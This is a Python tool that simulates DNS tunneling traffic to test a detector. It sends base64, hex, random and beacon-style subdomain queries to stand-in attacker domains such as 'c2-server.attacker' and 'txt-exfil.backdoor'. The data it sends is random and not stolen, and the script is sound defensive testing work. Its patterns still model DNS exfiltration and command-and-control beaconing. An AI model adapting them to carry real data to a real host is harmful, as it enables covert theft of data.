#!/usr/bin/env python3
"""
DNS Tunneling Simulation for Testing DNS Tunneling Detector

Generates suspicious DNS query patterns:
1. Base64-encoded subdomains (data exfiltration simulation)
2. Hex-encoded subdomains (C2 communication)
3. Long random subdomains (covert channel)
4. High query rate to suspicious domain

WARNING: Use only on authorized systems for testing purposes!
"""

import socket
import time
import sys
import random
import base64
import string
from datetime import datetime


def print_header(msg):
    """Print formatted header"""
    print("\n" + "="*60)
    print(f"  {msg}")
    print("="*60 + "\n")


def generate_base64_subdomain(data_length=30):
    """Generate a base64-encoded subdomain"""
    # Simulate encoded data
    data = ''.join(random.choices(string.ascii_letters + string.digits, k=data_length))
    encoded = base64.b64encode(data.encode()).decode().rstrip('=')
    # Make it look like a subdomain
    return encoded.lower().replace('+', '').replace('/', '')


def generate_hex_subdomain(length=40):
    """Generate a hex-encoded subdomain"""
    return ''.join(random.choices('0123456789abcdef', k=length))


def generate_random_subdomain(length=50):
    """Generate a random high-entropy subdomain"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def dns_query(subdomain, domain, dns_server='8.8.8.8', record_type='A'):
    """
    Send a DNS query.

    Args:
        subdomain: Subdomain to query
        domain: Base domain
        dns_server: DNS server to use
        record_type: DNS record type (A, TXT, etc.)

    Returns:
        True if query successful, False otherwise
    """
    full_domain = f"{subdomain}.{domain}"

    try:
        # Use socket.getaddrinfo for DNS resolution
        socket.getaddrinfo(full_domain, None)
        return True
    except socket.gaierror:
        # Expected - domain doesn't exist, but DNS query was sent
        return True
    except Exception as e:
        return False


def base64_exfiltration_simulation(base_domain, query_count, rate):
    """
    Simulate data exfiltration via DNS with base64-encoded subdomains.

    Args:
        base_domain: Base domain (e.g., 'attacker-c2.com')
        query_count: Number of queries to send
        rate: Queries per second
    """
    print_header(f"DATA EXFILTRATION (Base64): {base_domain}")
    print(f"Queries: {query_count}")
    print(f"Rate: {rate} queries/sec")
    print(f"Pattern: Base64-encoded subdomains")
    print(f"Start time: {datetime.now()}\n")

    delay = 1.0 / rate
    successful = 0
    failed = 0

    for i in range(query_count):
        # Generate base64-encoded subdomain (simulating exfiltrated data)
        subdomain = generate_base64_subdomain(data_length=random.randint(20, 40))

        if dns_query(subdomain, base_domain):
            successful += 1
            if (i + 1) % 10 == 0:
                print(f"  [{i+1:3d}/{query_count}] {subdomain[:30]}...{base_domain}")
        else:
            failed += 1

        time.sleep(delay)

    print(f"\nEnd time: {datetime.now()}")
    print(f"Summary: {successful} queries sent, {failed} failed")
    return {"successful": successful, "failed": failed}


def hex_c2_simulation(base_domain, query_count, rate):
    """
    Simulate C2 communication via DNS with hex-encoded subdomains.

    Args:
        base_domain: Base domain (e.g., 'malware-c2.net')
        query_count: Number of queries to send
        rate: Queries per second
    """
    print_header(f"C2 COMMUNICATION (Hex): {base_domain}")
    print(f"Queries: {query_count}")
    print(f"Rate: {rate} queries/sec")
    print(f"Pattern: Hex-encoded subdomains")
    print(f"Start time: {datetime.now()}\n")

    delay = 1.0 / rate
    successful = 0
    failed = 0

    for i in range(query_count):
        # Generate hex-encoded subdomain (simulating C2 commands)
        subdomain = generate_hex_subdomain(length=random.randint(32, 48))

        if dns_query(subdomain, base_domain):
            successful += 1
            if (i + 1) % 10 == 0:
                print(f"  [{i+1:3d}/{query_count}] {subdomain[:30]}...{base_domain}")
        else:
            failed += 1

        time.sleep(delay)

    print(f"\nEnd time: {datetime.now()}")
    print(f"Summary: {successful} queries sent, {failed} failed")
    return {"successful": successful, "failed": failed}


def random_covert_channel(base_domain, query_count, rate):
    """
    Simulate covert channel via DNS with random high-entropy subdomains.

    Args:
        base_domain: Base domain (e.g., 'covert-tunnel.org')
        query_count: Number of queries to send
        rate: Queries per second
    """
    print_header(f"COVERT CHANNEL (Random): {base_domain}")
    print(f"Queries: {query_count}")
    print(f"Rate: {rate} queries/sec")
    print(f"Pattern: Random high-entropy subdomains")
    print(f"Start time: {datetime.now()}\n")

    delay = 1.0 / rate
    successful = 0
    failed = 0

    for i in range(query_count):
        # Generate random subdomain (simulating covert data channel)
        subdomain = generate_random_subdomain(length=random.randint(40, 60))

        if dns_query(subdomain, base_domain):
            successful += 1
            if (i + 1) % 10 == 0:
                print(f"  [{i+1:3d}/{query_count}] {subdomain[:30]}...{base_domain}")
        else:
            failed += 1

        time.sleep(delay)

    print(f"\nEnd time: {datetime.now()}")
    print(f"Summary: {successful} queries sent, {failed} failed")
    return {"successful": successful, "failed": failed}


def high_frequency_beacon(base_domain, query_count, rate):
    """
    Simulate high-frequency DNS beaconing (periodic C2 check-ins).

    Args:
        base_domain: Base domain (e.g., 'beacon-server.com')
        query_count: Number of queries to send
        rate: Queries per second (high rate for detection)
    """
    print_header(f"HIGH FREQUENCY BEACON: {base_domain}")
    print(f"Queries: {query_count}")
    print(f"Rate: {rate} queries/sec")
    print(f"Pattern: Short beacons with high frequency")
    print(f"Start time: {datetime.now()}\n")

    delay = 1.0 / rate
    successful = 0
    failed = 0

    # Use consistent beacon format (UUID-like)
    beacon_id = ''.join(random.choices('0123456789abcdef', k=32))

    for i in range(query_count):
        # Generate beacon with sequence number
        subdomain = f"{beacon_id}-{i:04x}"

        if dns_query(subdomain, base_domain):
            successful += 1
            if (i + 1) % 15 == 0:
                print(f"  [{i+1:3d}/{query_count}] Beacon #{i+1}: {subdomain}.{base_domain}")
        else:
            failed += 1

        time.sleep(delay)

    print(f"\nEnd time: {datetime.now()}")
    print(f"Summary: {successful} beacons sent, {failed} failed")
    return {"successful": successful, "failed": failed}


def txt_record_exfiltration(base_domain, query_count, rate):
    """
    Simulate data exfiltration using TXT record queries.

    Args:
        base_domain: Base domain
        query_count: Number of queries to send
        rate: Queries per second
    """
    print_header(f"TXT RECORD EXFILTRATION: {base_domain}")
    print(f"Queries: {query_count}")
    print(f"Rate: {rate} queries/sec")
    print(f"Pattern: TXT record queries (uncommon)")
    print(f"Start time: {datetime.now()}\n")

    delay = 1.0 / rate
    successful = 0
    failed = 0

    for i in range(query_count):
        # Generate subdomain with "data chunk"
        subdomain = generate_base64_subdomain(data_length=25)

        # Note: socket.getaddrinfo doesn't support specifying record type
        # In real traffic, this would be a TXT query
        if dns_query(subdomain, base_domain):
            successful += 1
            if (i + 1) % 10 == 0:
                print(f"  [{i+1:3d}/{query_count}] TXT query: {subdomain}.{base_domain}")
        else:
            failed += 1

        time.sleep(delay)

    print(f"\nEnd time: {datetime.now()}")
    print(f"Summary: {successful} TXT queries sent, {failed} failed")
    return {"successful": successful, "failed": failed}


if __name__ == "__main__":
    print("\n" + "="*60)
    print("  DNS TUNNELING SIMULATION TOOL")
    print("  For Testing DNS Tunneling Detector")
    print("="*60)

    print("\n📝 NOTE: This script generates DNS queries only.")
    print("   Actual DNS tunneling requires a cooperating DNS server.")
    print("   These queries will fail but generate suspicious traffic patterns.\n")

    if len(sys.argv) > 1 and sys.argv[1] in ['-h', '--help']:
        print("Usage:")
        print(f"  {sys.argv[0]}")
        print("\nThis will run DNS tunneling simulations with:")
        print("  - Suspicious domain: suspicious-tunnel.malicious")
        print("  - C2 domain: c2-server.attacker")
        print("  - Beacon domain: periodic-beacon.evil")
        print("\nAll traffic patterns designed to trigger DNS tunneling detection.")
        sys.exit(0)

    print("⚠️  WARNING: Only use for testing DNS tunneling detection!")
    print("🎯 Target: Various suspicious domains")

    input("\nPress ENTER to continue or Ctrl+C to cancel...")

    # Scenario 1: Data exfiltration with base64
    base64_exfiltration_simulation(
        base_domain="suspicious-tunnel.malicious",
        query_count=25,
        rate=0.5  # 1 query every 2 seconds (high rate for small window)
    )
    time.sleep(1)

    # Scenario 2: C2 communication with hex encoding
    hex_c2_simulation(
        base_domain="c2-server.attacker",
        query_count=20,
        rate=0.4
    )
    time.sleep(1)

    # Scenario 3: Covert channel with random subdomains
    random_covert_channel(
        base_domain="covert-data.evil",
        query_count=18,
        rate=0.3
    )
    time.sleep(1)

    # Scenario 4: High frequency beaconing
    high_frequency_beacon(
        base_domain="periodic-beacon.malware",
        query_count=30,
        rate=0.6
    )
    time.sleep(1)

    # Scenario 5: TXT record exfiltration
    txt_record_exfiltration(
        base_domain="txt-exfil.backdoor",
        query_count=15,
        rate=0.3
    )

    print_header("DNS TUNNELING SIMULATION COMPLETE")
    print("✅ All scenarios executed")
    print("📦 Capture the traffic with tcpdump and analyze with pcap_analyzer")
    print("🔍 Expected detections:")
    print("   - 5 DNS tunneling attempts across different domains")
    print("   - Base64 encoding pattern")
    print("   - Hex encoding pattern")
    print("   - High entropy random subdomains")
    print("   - High query rates (>10 queries/min)")
    print("\n📊 Total DNS queries sent: ~108")
    print("🕐 Total duration: ~4-5 minutes\n")
